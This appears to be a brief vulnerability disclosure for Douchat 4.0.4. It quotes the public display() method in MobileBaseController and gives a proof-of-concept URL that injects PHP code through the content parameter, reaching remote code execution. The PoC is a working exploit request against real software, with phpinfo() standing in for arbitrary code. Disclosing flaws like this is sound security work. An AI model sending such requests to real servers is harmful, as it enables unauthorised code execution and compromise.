# Douchat4.0.4-RCE

Douchat's MobileBaseController.class.php page can be triggered by any template because the display method is set to public, which can trigger RCE vulnerability.

Core code
```
    public function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') {
        global $_G;
        if (empty($templateFile)) {
            $templateFile = $_G['addon_path'] . 'View/' . CONTROLLER_NAME . '/' . ACTION_NAME . C('TMPL_TEMPLATE_SUFFIX');
        } else {
            $tempArr = explode('/', $templateFile);
            switch (count($tempArr)) {
                case 1:
                    $templateFile = $_G['addon_path'] . 'View/' . CONTROLLER_NAME . '/' . $tempArr[0] . C('TMPL_TEMPLATE_SUFFIX');
                    break;
                case 2:
                    $templateFile = $_G['addon_path'] . 'View/' . CONTROLLER_NAME . '/' . $tempArr[0] . '/' . $tempArr[1] . C('TMPL_TEMPLATE_SUFFIX');
                    break;
                default:
                    break;
            }
        }
        if (!is_file($templateFile)) {
            E('模板不存在:'.$templateFile);
        }
        parent::display($templateFile,$charset,$contentType,$content,$prefix);
    }
```
Direct rendering of content without security detection before parent :: display
POC:
```
index.php?s=/Mp/MobileBase/display&templateFile=././index.php&prefix=&content=<php>phpinfo();</php>
```
